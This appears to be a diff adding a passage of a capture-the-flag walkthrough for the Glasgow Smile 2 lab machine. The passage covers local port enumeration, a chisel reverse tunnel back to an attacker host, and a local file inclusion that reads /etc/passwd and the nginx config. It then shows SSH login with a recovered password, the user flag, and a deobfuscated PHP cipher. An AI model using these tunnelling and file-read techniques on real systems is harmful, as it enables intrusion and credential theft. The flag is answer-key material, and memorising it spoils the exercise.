@@ -272,6 +272,299 @@ venom:x:1002:1002:venom,,,:/home/venom:/bin/bash
 riddler:x:1003:1003:Riddler,,,:/home/riddler:/bin/bash
 ```
 \
+So after a lot of enumeration , i checked the current listening ports on the machine using
+```bash
+netstat -tuln
+```
+```bash
+etstat -tuln
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::83                   :::*                    LISTEN     
+udp        0      0 0.0.0.0:68              0.0.0.0:*
+```
+\
+Here we can see that Port 8080 and 3306 are open , but only accessible locally 
+\
+So , i try to curl to port 8080
+```bash
+url 127.0.0.1:8080
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {font-family: Arial, Helvetica, sans-serif;}
+
+/* Full-width input fields */
+input[type=text], input[type=password] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+}
+
+/* Set a style for all buttons */
+button {
+  background-color: #000000;
+  color: white;
+  padding: 14px 20px;
+  margin: 8px 0;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+}
+
+button:hover {
+  opacity: 0.8;
+}
+
+/* Extra styles for the cancel button */
+
+.....Extra stuff
+```
+\
+And i see that it is a html document , so i setup port forwarding with chisel
+\
+Steps to setup portforwarding
+\
+1) ON attacker machine
+```bash
+   ./chisel_1.11.3_linux_amd64 server -p 9001 --reverse
+```
+\
+On target machine
+```bash
+wget 'https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz'
+gzip -d chisel_1.11.3_linux_amd64.gz
+chmod +x chisel_1.11.3_linux_amd64.gz
+./chisel_1.11.3_linux_amd64 client 192.168.0.105:9001 R:8983:127.0.0.1:8080
+```
+Here "./chisel_1.11.3_linux_amd64 client 192.168.0.105:9001 R:8983:127.0.0.1:8080" , we are forwarding port of 8080 of the machine ip "127.0.0.1" to port of 8983 of remote op "192.168.0.105"
+\
+Opening port 8983 in browser , shows
+\
+<img width="404" height="222" alt="image" src="https://github.com/user-attachments/assets/c6bc6ab9-f979-4560-9f42-622ec87f39c9" />
+\
+And if we check the source of this page , we see 2 interesting things 
+\
+First a comment that says this website is hosted with nginx and another , a page parameter taking the value of file location
+\
+<img width="1261" height="700" alt="image" src="https://github.com/user-attachments/assets/023304f3-3330-43f1-ad12-6fe3532981b1" />
+\
+I tried to access /etc/passwd using LFI vuln and successfully got it
+\
+<img width="1682" height="390" alt="image" src="https://github.com/user-attachments/assets/7b0e0de7-b159-4ad2-b5a3-7e5f3b2b3fa3" />
+\
+And since the comment was talking about nginx , we can try to get config file of nginx at "/etc/nginx/sites-enabled/default.conf"
+\
+<img width="1259" height="755" alt="image" src="https://github.com/user-attachments/assets/3e3b866d-5180-4dbf-bca8-0e683b531505" />
+\
+We can see something important here , we see a location path "/helpmeriddlernewapplication" and the file that is being served "/var/www/myplace/hereis/threatened/index.php"
+\
+When we access that location on browser , it says not found
+\
+<img width="1097" height="352" alt="image" src="https://github.com/user-attachments/assets/6f5e6608-df26-46b8-b046-a0cb4afac1c4" />
+\
+But , since we have an LFI vuln , we can try to directly access /var/www/myplace/hereis/threatened/index.php
+\
+When we access that file , we see a riddle
+\
+<img width="1303" height="743" alt="image" src="https://github.com/user-attachments/assets/68e6110b-0423-43de-9f6b-cd915fffcb6a" />
+\
+When i searched the riddle online , this site "https://www.riddles.com/6465" had the answer , and after entering the exact answer 
+\
+We get a popup with the password of the user riddler
+\
+<img width="437" height="123" alt="image" src="https://github.com/user-attachments/assets/87092f58-7876-4d79-a534-6f2170b0f751" />
+\
+then , we can ssh as riddler
+```bash
+ssh riddler@192.168.0.129                                    
+The authenticity of host '192.168.0.129 (192.168.0.129)' can't be established.
+ED25519 key fingerprint is SHA256:8wWNHKD7HjlHI3xkzCDtp8/UUgMsdB8tjPNBVTkCtGU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.0.129' (ED25519) to the list of known hosts.
+riddler@192.168.0.129's password: 
+Linux glasgowsmile2 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+riddler@glasgowsmile2:~$ id
+uid=1003(riddler) gid=1003(riddler) groups=1003(riddler)
+riddler@glasgowsmile2:~$ cat user.txt 
+GS2{52ed6cddca27b44be716f9b856744008}
+riddler@glasgowsmile2:~/theworldmustbeburned$ ls -la
+total 24
+drwxr-xr-x 2 riddler riddler 4096 Jul  9  2020 .
+drwxr-xr-x 4 riddler riddler 4096 Jul  9  2020 ..
+-rwxrwx--- 1 riddler riddler  845 Jun 30  2020 burn
+-rw-r----- 1 riddler riddler 1093 Jun 30  2020 info.txt
+-rw-r----- 1 riddler riddler  380 Jun 30  2020 jokerinthepack
+-rw-r----- 1 riddler riddler 1083 Jun 30  2020 message.txt
+riddler@glasgowsmile2:~/theworldmustbeburned$ cat info.txt 
+  __     __   __     _____    _____       _____       _____     _____    _____      _____     _____    __  __   
+ /\_\   /\_\ /_/\   /\___/\  /\ __/\     /\___/\    /\  __/\   /\___/\  /\ __/\    /\ __/\   /\___/\ /\  /\  /\ 
+ \/_/  ( ( (_) ) ) / / _ \ \ ) )  \ \   / / _ \ \   ) )(_ ) ) / / _ \ \ ) )  \ \   ) )  \ \ / / _ \ \\ \ \/ / / 
+  /\_\  \ \___/ /  \ \(_)/ // / /\ \ \  \ \(_)/ /  / / __/ /  \ \(_)/ // / /\ \ \ / / /\ \ \\ \(_)/ / \ \__/ /  
+ / / /  / / _ \ \  / / _ \ \\ \ \/ / /  / / _ \ \  \ \  _\ \  / / _ \ \\ \ \/ / / \ \ \/ / // / _ \ \  \__/ /   
+( (_(  ( (_( )_) )( (_( )_) )) )__/ /  ( (_( )_) )  ) )(__) )( (_( )_) )) )__/ /   ) )__/ /( (_( )_) ) / / /    
+ \/_/   \/_/ \_\/  \/_/ \_\/ \/___\/    \/_/ \_\/   \/____\/  \/_/ \_\/ \/___\/    \/___\/  \/_/ \_\/  \/_/     
+                                                                                                                
+
+Hey,
+listen to this song, maybe it could help you to try to understand my encryption code.
+Don't worry about it, it's impossible to break ;)
+
+https://www.youtube.com/watch?v=WV5-KhZMOtY
+
+
+riddler@glasgowsmile2:~/theworldmustbeburned$ cat message.txt 
+Your keys:
+Key 1: I make them laught a lot
+Key 2: Because jokers are wild
+Encrypted string:2188F2236A2200F2236A2269F2301A2263F2291A2186F2299A2255F2300A2186F2287A2268F2291A2264F2229A2270F2222A2262F2301A2265F2297A2259F2300A2257F2222A2256F2301A2268F2222A2251F2300A2275F2306A2258F2295A2264F2293A2186F2298A2265F2293A2259F2289A2251F2298A2198F2222A2262F2295A2261F2291A2186F2299A2265F2300A2255F2311A2200F2222A2238F2294A2255F2311A2186F2289A2251F2300A2193F2306A2186F2288A2255F2222A2252F2301A2271F2293A2258F2306A2198F2222A2252F2307A2262F2298A2259F2291A2254F2234A2186F2304A2255F2287A2269F2301A2264F2291A2254F2234A2186F2301A2268F2222A2264F2291A2257F2301A2270F2295A2251F2306A2255F2290A2186F2309A2259F2306A2258F2236A2186F2273A2265F2299A2255F2222A2263F2291A2264F2222A2260F2307A2269F2306A2186F2309A2251F2300A2270F2222A2270F2301A2186F2309A2251F2306A2253F2294A2186F2306A2258F2291A2186F2309A2265F2304A2262F2290A2186F2288A2271F2304A2264F2236A2188F2222A2239F2260A2240F2259A2205F2244A2225F2308A2239F2299A2229F2242A2238F2289A2244F2257A2274F2256A2258F2246A2272F2275A2223F2277A2271F2279A2255F2297A2221F2279A
+
+riddler@glasgowsmile2:~/theworldmustbeburned$ cat jokerinthepack 
+Oh my boots they shine
+And my bowler looks fine
+Take some time and care
+Take a look at my hair
+We hit the dance hall
+So smart and so chic
+I make them laught a lot
+I make them accept me
+Secrets are spoken
+Plans are drawn in the dust
+With a gay bravado
+I'm taken into their trust
+Oh my boots they shine
+And my bowler looks fine
+But don't confide in my smile
+Because jokers are wild
+```
+\
+There is also a file burn, which has executable permissions, so i try to run , but it throws an error
+```bash
+riddler@glasgowsmile2:~/theworldmustbeburned$ ./burn 
+./burn: line 1: syntax error near unexpected token `('
+./burn: line 1: `<?php function grdl($q0){$b1=fopen($q0,'r')or die();$a2=0;while(!feof($b1)){$t3=fgets($b1);$a2++;}rewind($b1);$s4=0;$n5=rand(0,$a2);while((!feof($b1))&&($s4<=$n5)){if($x6=fgets($b1,1048576)){$s4++;}}fclose($b1)or die();return $x6;}function gws($n7){$j8=str_split($n7);$a9=0;foreach($j8 as $m10){$a9+=ord($m10);}return $a9;}function encrypt($c11,$j12,$e13){$f14=true;$l15=gws($c11);$q16=gws($j12);$f17=str_split($e13);$a18="";foreach($f17 as $m10){$f14=!$f14;$p19=$l15;if($f14){$p19=$q16;}$a18.=ord($m10)+$p19;if($f14){$a18.="A";}else{$a18.="F";}}return $a18;}$q0="jokerinthepack";$e13=readline("Enter the string to encrypt: ");$c11=trim(grdl($q0));$j12=trim(grdl($q0));print"\n";print"Your keys:";print"\n";print"Key 1: ".$c11;print"\n";print"Key 2: ".$j12;print"\n";$a18=trim(encrypt($c11,$j12,$e13));print"Encrypted string:".$a18."\n\n\n";?>'
+```
+```
+riddler@glasgowsmile2:~/theworldmustbeburned$ strings burn 
+<?php function grdl($q0){$b1=fopen($q0,'r')or die();$a2=0;while(!feof($b1)){$t3=fgets($b1);$a2++;}rewind($b1);$s4=0;$n5=rand(0,$a2);while((!feof($b1))&&($s4<=$n5)){if($x6=fgets($b1,1048576)){$s4++;}}fclose($b1)or die();return $x6;}function gws($n7){$j8=str_split($n7);$a9=0;foreach($j8 as $m10){$a9+=ord($m10);}return $a9;}function encrypt($c11,$j12,$e13){$f14=true;$l15=gws($c11);$q16=gws($j12);$f17=str_split($e13);$a18="";foreach($f17 as $m10){$f14=!$f14;$p19=$l15;if($f14){$p19=$q16;}$a18.=ord($m10)+$p19;if($f14){$a18.="A";}else{$a18.="F";}}return $a18;}$q0="jokerinthepack";$e13=readline("Enter the string to encrypt: ");$c11=trim(grdl($q0));$j12=trim(grdl($q0));print"\n";print"Your keys:";print"\n";print"Key 1: ".$c11;print"\n";print"Key 2: ".$j12;print"\n";$a18=trim(encrypt($c11,$j12,$e13));print"Encrypted string:".$a18."\n\n\n";?>
+```
+\
+After seeing the content , i realise its a php file and create a new file source.php after formatiing it
+```
+<?php
+
+function grdl($q0) {
+    $b1 = fopen($q0, 'r') or die();
+    $a2 = 0;
+
+    // Count lines
+    while (!feof($b1)) {
+        $t3 = fgets($b1);
+        $a2++;
+    }
+
+    rewind($b1);
+
+    // Pick random line
+    $s4 = 0;
+    $n5 = rand(0, $a2);
+
+    while ((!feof($b1)) && ($s4 <= $n5)) {
+        if ($x6 = fgets($b1, 1048576)) {
+            $s4++;
+        }
+    }
+
+    fclose($b1) or die();
+    return $x6;
+}
+
+function gws($n7) {
+    $j8 = str_split($n7);
+    $a9 = 0;
+
+    foreach ($j8 as $m10) {
+        $a9 += ord($m10);
+    }
+
+    return $a9;
+}
+
+function encrypt($c11, $j12, $e13) {
+    $f14 = true;
+    $l15 = gws($c11);
+    $q16 = gws($j12);
+
+    $f17 = str_split($e13);
+    $a18 = "";
+
+    foreach ($f17 as $m10) {
+        $f14 = !$f14;
+
+        $p19 = $l15;
+        if ($f14) {
+            $p19 = $q16;
+        }
+
+        $a18 .= ord($m10) + $p19;
+
+        if ($f14) {
+            $a18 .= "A";
+        } else {
+            $a18 .= "F";
+        }
+    }
+
+    return $a18;
+}
+
+$q0 = "jokerinthepack";
+
+$e13 = readline("Enter the string to encrypt: ");
+
+$c11 = trim(grdl($q0));
+$j12 = trim(grdl($q0));
+
+print "\n";
+print "Your keys:\n";
+print "Key 1: " . $c11 . "\n";
+print "Key 2: " . $j12 . "\n";
+
+$a18 = trim(encrypt($c11, $j12, $e13));
+
+print "Encrypted string:" . $a18 . "\n\n\n";
+
+?>
+```
+\
+
+
+
+
+
+
+
+
+
+
 After some time , i didnt know how to escalate privileges , so i ran pspy and i found a unique process being run by user wit uid 1002
 \
 <img width="758" height="22" alt="image" src="https://github.com/user-attachments/assets/89724dfa-eeab-4585-9f3a-b6ed5e12cde8" />
